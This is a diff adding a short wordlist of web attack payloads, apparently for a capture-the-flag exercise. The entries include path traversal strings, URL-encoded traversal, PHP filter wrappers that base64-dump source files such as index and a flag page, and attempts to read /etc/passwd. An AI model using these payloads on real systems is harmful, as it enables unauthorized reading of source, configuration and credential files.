@@ -1,0 +1,16 @@
+home
+flag
+../config
+../index
+../includes/functions
+../includes/function
+../includes/utils
+../includes/config
+php://filter/convert.base64-encode/resource=index
+php://filter/convert.base64-encode/resource=pages/flag
+../php://filter/convert.base64-encode/resource=index
+..%2fconfig
+..%2findex
+..%2fpages%2fflag
+/etc/passwd
+../../../etc/passwd
